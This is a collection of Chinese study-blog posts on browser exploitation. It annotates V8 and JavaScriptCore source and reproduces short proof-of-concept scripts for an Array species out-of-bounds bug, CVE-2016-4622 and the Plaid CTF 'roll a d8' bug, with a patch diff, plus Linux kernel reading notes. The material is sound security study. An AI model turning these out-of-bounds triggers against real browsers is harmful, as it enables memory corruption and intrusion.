class="line">  len_ = merged_length.value();</span><br><span class="line">  <span class="comment">// 5. If IsCallable(callbackfn) is false, throw a TypeError exception.</span></span><br><span class="line">  <span class="function">Label <span class="title">type_exception</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line">  <span class="function">Label <span class="title">done</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 并不知道这个callbackfn是做什么的</span></span><br><span class="line"></span><br><span class="line">  GotoIf(TaggedIsSmi(callbackfn()), &amp;type_exception);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这一步看名字是在获取map，根据callbackfn()的返回值</span></span><br><span class="line">  <span class="comment">// 有点混淆，究竟是对象结构的那个map，还是成员函数的那个map</span></span><br><span class="line"></span><br><span class="line">  Branch(IsCallableMap(LoadMap(callbackfn())), &amp;done, &amp;type_exception);</span><br><span class="line">  BIND(&amp;throw_null_undefined_exception);</span><br><span class="line">  &#123;</span><br><span class="line">    CallRuntime(</span><br><span class="line">        Runtime::kThrowTypeError, context(),</span><br><span class="line">        SmiConstant(MessageTemplate::kCalledOnNullOrUndefined),</span><br><span class="line">        HeapConstant(isolate()-&gt;factory()-&gt;NewStringFromAsciiChecked(name)));</span><br><span class="line">    Unreachable();</span><br><span class="line">  &#125;</span><br><span class="line">  BIND(&amp;type_exception);</span><br><span class="line">  &#123;</span><br><span class="line">    CallRuntime(Runtime::kThrowTypeError, context(),</span><br><span class="line">                SmiConstant(MessageTemplate::kCalledNonCallable),</span><br><span class="line">                callbackfn());</span><br><span class="line">    Unreachable();</span><br><span class="line">  &#125;</span><br><span class="line">  BIND(&amp;done);</span><br><span class="line">  <span class="comment">// 6. If thisArg was supplied, let T be thisArg; else let T be undefined.</span></span><br><span class="line">  <span class="comment">// [Already done by the arguments adapter]</span></span><br><span class="line">  <span class="keyword">if</span> (direction == ForEachDirection::kForward) &#123;</span><br><span class="line">    <span class="comment">// 7. Let k be 0.</span></span><br><span class="line">    k_.Bind(SmiConstant(<span class="number">0</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    k_.Bind(NumberDec(len()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 漏洞发现者说generator是map的那个参数，等会看一下</span></span><br><span class="line"></span><br><span class="line">  a_.Bind(generator(<span class="keyword">this</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 漏洞发现者解释说，这个函数是用来使用o_的迭代器来做映射操作，对数组的每个值调用处理器然后将结果写入a_</span></span><br><span class="line"></span><br><span class="line">  HandleFastElements(processor, action, &amp;slow, direction);</span><br><span class="line">  BIND(&amp;slow);</span><br><span class="line">  Node* result =</span><br><span class="line">      CallStub(slow_case_continuation, context(), receiver(), callbackfn(),</span><br><span class="line">               this_arg(), a_.value(), o(), k_.value(), len(), to_.value());</span><br><span class="line">  ReturnFromBuiltin(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>src/builtins/builtins-array-gen.cc</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">TF_BUILTIN(ArrayMap, ArrayBuiltinCodeStubAssembler) &#123;</span><br><span class="line">  Node* argc =</span><br><span class="line">      ChangeInt32ToIntPtr(Parameter(BuiltinDescriptor::kArgumentsCount));</span><br><span class="line">  <span class="function">CodeStubArguments <span class="title">args</span><span class="params">(<span class="keyword">this</span>, argc)</span></span>;</span><br><span class="line">  Node* context = Parameter(BuiltinDescriptor::kContext);</span><br><span class="line">  Node* new_target = Parameter(BuiltinDescriptor::kNewTarget);</span><br><span class="line">  Node* receiver = args.GetReceiver();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 原来callbackfn就是callback function，即map的第一个参数</span></span><br><span class="line">  <span class="comment">// this_arg就是map函数的可选参数</span></span><br><span class="line"></span><br><span class="line">  Node* callbackfn = args.GetOptionalArgumentValue(<span class="number">0</span>, UndefinedConstant());</span><br><span class="line">  Node* this_arg = args.GetOptionalArgumentValue(<span class="number">1</span>, UndefinedConstant());</span><br><span class="line">  InitIteratingArrayBuiltinBody(context, receiver, callbackfn, this_arg,</span><br><span class="line">                                new_target, argc);</span><br><span class="line">  GenerateIteratingArrayBuiltinBody(</span><br><span class="line">      <span class="string">"Array.prototype.map"</span>, &amp;ArrayBuiltinCodeStubAssembler::MapResultGenerator,</span><br><span class="line">      &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,</span><br><span class="line">      &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction,</span><br><span class="line">      Builtins::CallableFor(isolate(), Builtins::kArrayMapLoopContinuation));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后重点就应该是这个<code>&amp;ArrayBuiltinCodeStubAssembler::MapResultGenerator</code>，我们来看看它是啥</p>
<p>src/builtins/builtins-array-gen.cc</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">MapResultGenerator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 5. Let A be ? ArraySpeciesCreate(O, len).</span></span><br><span class="line">    <span class="keyword">return</span> ArraySpeciesCreate(context(), o(), len_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>src/code-stub-assembler.cc</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Node* CodeStubAssembler::ArraySpeciesCreate(Node* context, Node* originalArray,</span><br><span class="line">                                            Node* len) &#123;</span><br><span class="line">  <span class="comment">// TODO(mvstanton): Install a fast path as well, which avoids the runtime</span></span><br><span class="line">  <span class="comment">// call.</span></span><br><span class="line">  Node* constructor =</span><br><span class="line">      CallRuntime(Runtime::kArraySpeciesConstructor, context, originalArray);</span><br><span class="line">  <span class="keyword">return</span> ConstructJS(CodeFactory::Construct(isolate()), context, constructor,</span><br><span class="line">                     len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我已经有点看不懂了，但是也似乎有点懂了</p>
<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Copyright 2017 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"><span class="comment">// Flags: --verify-heap</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Array1</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(len) &#123;</span><br><span class="line">      <span class="keyword">super</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyArray</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">get</span> [Symbol.species]() &#123;</span><br><span class="line">      <span class="keyword">return</span> Array1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">a = <span class="keyword">new</span> MyArray();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">  a.push(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">a.map(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> <span class="number">42</span>; &#125;);</span><br></pre></td></tr></table></figure>

<p>看起来就是，自定了一个数组的构造函数，不管长度是多少都只会生成长度为1的数组</p>
<p>for循环将数组的长度增长到了100000，然后调用map函数的时候，由于它会再次调用构造函数，但是程序以为的长度却是现在数组的长度，就会造成，生成了一个程序以为是100000长度但实际上是1长度的数组，就造成了oob</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>v8的代码真难读，各种调用各种跳转，太难了……</p>
]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>chrome</tag>
        <tag>v8</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>学习《深入linux内核架构》(1)</title>
    <url>/2019/10/29/%E5%AD%A6%E4%B9%A0%E3%80%8A%E6%B7%B1%E5%85%A5linux%E5%86%85%E6%A0%B8%E6%9E%B6%E6%9E%84%E3%80%8B-1/</url>
    <content><![CDATA[<p>刚读完第一章，再略看一遍顺便记一下</p>
<a id="more"></a>

<h1 id="第一章-简介和概述"><a href="#第一章-简介和概述" class="headerlink" title="第一章 简介和概述"></a>第一章 简介和概述</h1><h2 id="内核的任务"><a href="#内核的任务" class="headerlink" title="内核的任务"></a>内核的任务</h2><ul>
<li>内核是应用程序所知道的层次结构中的最底层，时一台增强的计算机</li>
<li>当若干程序在同一系统中并发运行时，可以将内核视为资源管理程序</li>
<li>内核提供系统调用用于向计算机发送请求</li>
</ul>
<h2 id="实现策略"><a href="#实现策略" class="headerlink" title="实现策略"></a>实现策略</h2><ul>
<li><p>微内核</p>
<ul>
<li>只有最基本的功能直接由中央内核实现，其他所有的功能都委托给一些独立进程，这些进程通过明确定义的通信接口与中心内核通信</li>
</ul>
</li>
<li><p>宏内核</p>
<ul>
<li>它是构建系统内核的传统方法，即将内核的全部功能打包到一个文件中</li>
</ul>
</li>
</ul>
<h2 id="内核的组成部分"><a href="#内核的组成部分" class="headerlink" title="内核的组成部分"></a>内核的组成部分</h2><h3 id="进程、进程切换、调度"><a href="#进程、进程切换、调度" class="headerlink" title="进程、进程切换、调度"></a>进程、进程切换、调度</h3><p>传统上，UNIX操作系统下运行的应用程序、服务器以及其他程序都称为<strong>进程</strong></p>
<p>各进程空间完全独立，进程之间并不会意识到彼此的存在</p>
<p>Linux是多任务系统，它支持（看上去）并发执行的若干进程。系统中真正在同时运行的进程数最多不超过CPU的数量</p>
<h3 id="UNIX进程"><a href="#UNIX进程" class="headerlink" title="UNIX进程"></a>UNIX进程</h3><p>linux对进程采用了一种层次结构，每个进程都依赖于一个父进程</p>
<p><strong>内核启动init程序作为第一个进程</strong>，它负责进一步的系统初始化操作</p>
<p>因此init是进程树的根</p>
<p><code>pstree</code>程序可以输出进程树</p>
<p>UNIX有两种创建新进程的机制：</p>
<ul>
<li>fork<ul>
<li>创建当前进程的一个副本，父进程与子进程只有PID不同。父进程的内存的内容被复制给子进程。为了使fork更高效，linux使用了<strong>写时复制</strong></li>
</ul>
</li>
<li>exec<ul>
<li>将一个新程序加载到当前进程的内存中并执行。旧的内存页将被刷出，其内容将被替换成新数据。然后开始执行新程序（那么getshell应该都是用这种方式开启shell的）</li>
</ul>
</li>
</ul>
<h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><p>线程，有时又被称为轻量级进程。它与进程共享同样的地址空间</p>
<p>linux采用clone的方法创建线程。它的工作方式类似于fork，但是会进行更加精确的检查，以确定哪些资源是共享，哪些资源是线程独享的。在一定程度上，线程和进程是可以连续转换的</p>
<h4 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h4><p>每个命名空间可以包含一个特定的PID集合，或可以提供文件系统不同的视图，在某个命名空间中挂载的卷不会传播到其他命名空间内</p>
<p>我的理解就是，不同命名空间就如同科幻片中不同的地球一样，虽然都是地球，但彼此是分离的</p>
<p>docker就使用了这一技术</p>
<h3 id="地址空间与特权级别"><a href="#地址空间与特权级别" class="headerlink" title="地址空间与特权级别"></a>地址空间与特权级别</h3><p>linux将虚拟地址划分为两个部分，分别是内核空间和用户空间：</p>
<table>
<thead>
<tr>
<th align="center">内核空间</th>
<th align="center">TASK_SIZE - $2^{32}$ or $2^{64}$</th>
</tr>
</thead>
<tbody><tr>
<td align="center">用户空间</td>
<td align="center">0 - TASK_SIZE</td>
</tr>
</tbody></table>
<p>TASK_SIZE是一个特定于计算机体系结构的常数，不同架构的系统有不同的划分</p>
<h4 id="特权级别"><a href="#特权级别" class="headerlink" title="特权级别"></a>特权级别</h4><p>linux只有两个不同的状态：核心态和用户态</p>
<p>在用户态禁止访问核心态地址空间，从用户态转到核心态的切换通过系统调用的方式来完成，且系统调用的执行因具体系统而不同</p>
<p>除了代表用户程序执行代码之外，内核还可以由异步硬件中断激活，然后在中断上下文运行</p>
<p>除了普通进程，系统中还有内核线程在运行。内核线程不予任何特定的用户空间进程相关联，因此无权处理用户空间</p>
<h4 id="虚拟和物理地址空间"><a href="#虚拟和物理地址空间" class="headerlink" title="虚拟和物理地址空间"></a>虚拟和物理地址空间</h4><p>用页表来为物理内存分配虚拟地址。物理内存页常被称为页帧</p>
<h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>用来将虚拟地址空间映射到物理地址空间的数据结构称为页表，linux下用四级页表来管理映射关系</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>系统调用是用户进程与内核交互的经典方法。传统的系统调用按不同类别分组：</p>
<ul>
<li>进程管理：创建新进程，查询信息，调试</li>
<li>信号：发送信号，定时器以及相关处理机制</li>
<li>文件：创建、打开和关闭文件，从文件读取和向文件写入，查询信息和状态</li>
<li>目录和文件系统：创建、删除和重命名目录，查询信息，链接，变更目录</li>
<li>保护机制：读取和变更UID/GID，命名空间的处理</li>
<li>定时器函数：定时器函数和统计信息</li>
</ul>
<p>所有这些函数都对内核提出了要求。这些函数不能以普通用户库的方式实现，因为需要特别的保护机制来保证系统稳定性或安全不受危及</p>
<h3 id="设备驱动程序、块设备和字符设备"><a href="#设备驱动程序、块设备和字符设备" class="headerlink" title="设备驱动程序、块设备和字符设备"></a>设备驱动程序、块设备和字符设备</h3><p>对外设的访问可以利用<code>/dev</code>目录下的设备文件来完成，程序对设备的处理类似于常规文件</p>
<p>外设可分为两类：</p>
<ul>
<li>字符设备：提供连续的数据流，应用程序可以顺序读取，通常不支持随机存取。此类设备支持按字节/字符来读写数据</li>
<li>块设备：应用程序可以随机访问设备数据，程序可以自行确定读取数据的位置。但是，数据的读写只能以块（通常是512B）的倍数进行。其不支持基于字符的寻址</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>许多东西上课都学过，权当复习</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>学习JS引擎</title>
    <url>/2019/10/29/%E5%AD%A6%E4%B9%A0JS%E5%BC%95%E6%93%8E/</url>
    <content><![CDATA[<p>参考：</p>
<ul>
<li><a href="http://www.phrack.org/papers/attacking_javascript_engines.html（英文）" target="_blank" rel="noopener">http://www.phrack.org/papers/attacking_javascript_engines.html（英文）</a></li>
<li><a href="https://paper.seebug.org/207/#11-vmnan-boxing（翻译）" target="_blank" rel="noopener">https://paper.seebug.org/207/#11-vmnan-boxing（翻译）</a></li>
</ul>
<p>阅读这种英文文献，我感觉是必须边读边写的</p>
<p>如果读翻译的话……可能是我理解力不够，反正我看不懂</p>
<a id="more"></a>

<h1 id="JS引擎回顾"><a href="#JS引擎回顾" class="headerlink" title="JS引擎回顾"></a>JS引擎回顾</h1><h2 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h2><p>js的VM具有可以直接执行发出的字节码的解释器。它的VM通常被实现为一个基于栈的机器，它的各种操作都是围绕着栈来实现的。这对我来说已经在wasm的反编译和v8字节码的反编译上见识过了</p>
<h2 id="对象和数组"><a href="#对象和数组" class="headerlink" title="对象和数组"></a>对象和数组</h2><p>js的对象基本上是基于键值对存储的，可以用点运算符或者方括号来访问属性</p>
<p>数组就是一个特殊的对象，它的键是连续的从0开始到比length小1的连续整型。比如声明一个数组<code>var a = [1,2,3]</code>，用<code>a[1]</code>访问会得到2，用<code>a[&#39;1&#39;]</code>访问也会得到2，但是用<code>a.1</code>来访问就会报错了</p>
<p>在内部，js内核将属性和元素存储在通过一个内存区域中，并在对象本身中存储指向该区域的指针。这个指针指向区域的中间，区域的左边（低地址）是属性，右边（高地址）是元素，长度在指针的刚刚左边(?<em>?)，这看起来就像是蝴蝶(??</em>??)。程序员的奇妙思想，为什么不叫麻雀呢</p>
<p>剩下的看不懂</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数执行的时候，会有两个特殊的变量，一个是<code>arguments</code>，用来访问函数的参数，另一个就是<code>this</code>，指向函数的调用者：</p>
<ul>
<li>如果函数以<code>new func()</code>的方式调用的话，this就指向一个新创建的对象，或者函数本身返回一个对象的话，this就指向这个对象，它具有<code>.prototype</code>属性</li>
<li>如果函数以<code>obj.func()</code>的方式调用的话，this就指向的是obj</li>
<li>如果函数以<code>func()</code>的方式效用的话，this就指向当前的全局对象，大概就是根对象吧</li>
</ul>
<p>函数还有两个有趣的属性，<code>.call</code>和<code>.apply</code>，它们可以让你用指定的this来调用函数。<code>call()</code>方法的作用和<code>apply()</code>方法类似，区别就是<code>call()</code>方法接受的是参数列表，而<code>apply()</code>方法接受的是一个参数数组。</p>
<p>装饰器：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params">func</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">            <span class="comment">// do something with arguments[i]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> func.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内置函数和方法通常由两种方式之一实现：C++或者js本身</p>
<p>例如，<code>Math.pow()</code>就是用c++实现的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">EncodedJSValue JSC_HOST_CALL mathProtoFuncPow(ExecState* exec)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ECMA 15.8.2.1.13</span></span><br><span class="line">    double arg = exec-&gt;argument(<span class="number">0</span>).toNumber(exec);</span><br><span class="line">    double arg2 = exec-&gt;argument(<span class="number">1</span>).toNumber(exec);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JSValue::encode(JSValue(operationMathPow(arg, arg2)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>能看出来：</p>
<ul>
<li>本地js的特色</li>
<li>参数是如何用<code>argument</code>函数提取的（若参数不存在则返回<code>undefined</code>）</li>
<li>参数是如何转化为它们所需要的类型的</li>
<li>实际的操作是如何本地数据类型来操作的</li>
<li>结果是如何返回给<code>caller</code>的</li>
</ul>
<p>不同操作的核心实现都是被移入了分别的函数中，所以它们能直接被JIT编译的代码调用</p>
<h1 id="CVE-2016-4622"><a href="#CVE-2016-4622" class="headerlink" title="CVE-2016-4622"></a><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4622" target="_blank" rel="noopener">CVE-2016-4622</a></h1><p>该漏洞是WebKit中JSC的一个漏洞</p>
<p>问题出现在<code>Array.prototype.slice</code>函数（或者说，方法），它的用法如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> s = a.slice(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//是就是索引为[1,3)的所有元素，即[2,3]</span></span><br></pre></td></tr></table></figure>

<p>为了可读性，原作者将ArrayPrototype.cpp的代码格式化之后精简了一下</p>
<p>JSC中它的代码如下：</p>
<p>照例写注释</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">EncodedJSValue JSC_HOST_CALL <span class="title">arrayProtoFuncSlice</span><span class="params">(ExecState* exec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* [[ 1 ]] */</span></span><br><span class="line">    JSObject* thisObj = exec-&gt;thisValue();</span><br><span class="line">    <span class="comment">//获取this指针，即调用它的数组</span></span><br><span class="line">    .toThis(exec, StrictMode)</span><br><span class="line">    .toObject(exec);</span><br><span class="line">    <span class="keyword">if</span> (!thisObj)</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(JSValue());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* [[ 2 ]] */</span></span><br><span class="line">    <span class="keyword">unsigned</span> length = getLength(exec, thisObj);</span><br><span class="line">    <span class="comment">//获取数组的长度</span></span><br><span class="line">    <span class="keyword">if</span> (exec-&gt;hadException())</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* [[ 3 ]] */</span></span><br><span class="line">    <span class="keyword">unsigned</span> begin = argumentClampedIndexFromStartOrEnd(exec, <span class="number">0</span>, length);</span><br><span class="line">    <span class="keyword">unsigned</span> end =</span><br><span class="line">    argumentClampedIndexFromStartOrEnd(exec, <span class="number">1</span>, length, length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* [[ 4 ]] */</span></span><br><span class="line">    <span class="comment">//检查是否使用了构造函数  (why?)</span></span><br><span class="line">    <span class="built_in">std</span>::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult =</span><br><span class="line">    speciesConstructArray(exec, thisObj, end - begin);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// We can only get an exception if we call some user function.</span></span><br><span class="line">    <span class="keyword">if</span> (UNLIKELY(speciesResult.first ==</span><br><span class="line">                 SpeciesConstructResult::Exception))</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* [[ 5 ]] */</span></span><br><span class="line">    <span class="comment">//如果数组是具有密集存储的本地数据，则使用fastslice进行切片</span></span><br><span class="line">    <span class="keyword">if</span> (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp;</span><br><span class="line">               isJSArray(thisObj))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (JSArray* result =</span><br><span class="line">            asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin))</span><br><span class="line">            <span class="keyword">return</span> JSValue::encode(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//或者使用简单循环来切片</span></span><br><span class="line">    JSObject* result;</span><br><span class="line">    <span class="keyword">if</span> (speciesResult.first == SpeciesConstructResult::CreatedObject)</span><br><span class="line">        result = speciesResult.second;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        result = constructEmptyArray(exec, <span class="literal">nullptr</span>, end - begin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> k = begin; k &lt; end; k++, n++) &#123;</span><br><span class="line">        JSValue v = getProperty(exec, thisObj, k);</span><br><span class="line">        <span class="keyword">if</span> (exec-&gt;hadException())</span><br><span class="line">            <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">        <span class="keyword">if</span> (v)</span><br><span class="line">            result-&gt;putDirectIndex(exec, n, v);</span><br><span class="line">    &#125;</span><br><span class="line">    setLength(exec, result, n);</span><br><span class="line">    <span class="keyword">return</span> JSValue::encode(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么，这个漏洞就和plaidCTF那个很像了</p>
<p>由于获取length位于获取begin和end之前，而如果在获取了begin和end的时候修改了数组长度，那么就会因为实际数组长度比程序以为的数组长度小，就会导致数组越界</p>
]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>学习 Plaid CTF&#39;s roll a d8</title>
    <url>/2019/10/27/%E5%AD%A6%E4%B9%A0-Plaid-CTF-s-roll-a-d8/</url>
    <content><![CDATA[<p>这道题是一个真实的漏洞，学习价值很高</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/147829?from=timeline" target="_blank" rel="noopener">https://www.anquanke.com/post/id/147829?from=timeline</a></li>
<li><a href="https://xz.aliyun.com/t/5190" target="_blank" rel="noopener">https://xz.aliyun.com/t/5190</a></li>
</ul>
<a id="more"></a>

<p>commit: <a href="https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d</a></p>
<h1 id="分析Poc"><a href="#分析Poc" class="headerlink" title="分析Poc"></a>分析Poc</h1><p>Poc: </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [];</span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">        oobArray.length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">oobArray[oobArray.length - <span class="number">1</span>] = <span class="number">0x41414141</span>;</span><br></pre></td></tr></table></figure>

<p><code>Array.from()</code>方法从一个类似数组或可迭代对象创建一个新的，浅拷贝的数组实例</p>
<p><code>Function.prototype.call()</code>方法使用一个指定的 this 值和单独给出的一个或多个参数来调用一个函数</p>
<p>那么，<code>Array.from.call()</code>就是指定this以及参数来执行<code>Array.from()</code></p>
<p>如果想知道为什么这会出问题，就得看一下v8的源码以及patch了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array-gen.cc b/src/builtins/builtins-array-gen.cc</span><br><span class="line">index dcf3be4..3a74342 100644</span><br><span class="line">--- a/src/builtins/builtins-array-gen.cc</span><br><span class="line">+++ b/src/builtins/builtins-array-gen.cc</span><br><span class="line">@@ -1945,10 +1945,13 @@</span><br><span class="line">   void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array,</span><br><span class="line">                          TNode&lt;Number&gt; length) &#123;</span><br><span class="line">     Label fast(this), runtime(this), done(this);</span><br><span class="line">+    // TODO(delphick): We should be able to skip the fast set altogether, if the</span><br><span class="line">+    // length already equals the expected length, which it always is now on the</span><br><span class="line">+    // fast path.</span><br><span class="line">     // Only set the length in this stub if</span><br><span class="line">     // 1) the array has fast elements,</span><br><span class="line">     // 2) the length is writable,</span><br><span class="line">-    // 3) the new length is greater than or equal to the old length.</span><br><span class="line">+    // 3) the new length is equal to the old length.</span><br><span class="line"> </span><br><span class="line">     // 1) Check that the array has fast elements.</span><br><span class="line">     // TODO(delphick): Consider changing this since it does an an unnecessary</span><br><span class="line">@@ -1970,10 +1973,10 @@</span><br><span class="line">       // BranchIfFastJSArray above.</span><br><span class="line">       EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line"> </span><br><span class="line">-      // 3) If the created array already has a length greater than required,</span><br><span class="line">+      // 3) If the created array&apos;s length does not match the required length,</span><br><span class="line">       //    then use the runtime to set the property as that will insert holes</span><br><span class="line">-      //    into the excess elements and/or shrink the backing store.</span><br><span class="line">-      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line">+      //    into excess elements or shrink the backing store as appropriate.</span><br><span class="line">+      GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);</span><br><span class="line"> </span><br><span class="line">       StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                      length_smi);</span><br></pre></td></tr></table></figure>

<p>可以看出主要修改了上述的函数</p>
<p>看一下array.from的相关部分</p>
<p>这里是获取了iterator，即poc中的第二个参数之后进行的事情</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BIND(&amp;iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    TVARIABLE(Number, index, SmiConstant(0));</span><br><span class="line">    TVARIABLE(Object, var_exception);</span><br><span class="line">    Label loop(this, &amp;index), loop_done(this),</span><br><span class="line">        on_exception(this, Label::kDeferred),</span><br><span class="line">        index_overflow(this, Label::kDeferred);</span><br><span class="line">    // Check that the method is callable.</span><br><span class="line">    &#123;</span><br><span class="line">      Label get_method_not_callable(this, Label::kDeferred), next(this);</span><br><span class="line">      GotoIf(TaggedIsSmi(iterator_method), &amp;get_method_not_callable);</span><br><span class="line">      GotoIfNot(IsCallable(iterator_method), &amp;get_method_not_callable);</span><br><span class="line">      Goto(&amp;next);</span><br><span class="line">      BIND(&amp;get_method_not_callable);</span><br><span class="line">      ThrowTypeError(context, MessageTemplate::kCalledNonCallable,</span><br><span class="line">                     iterator_method);</span><br><span class="line">     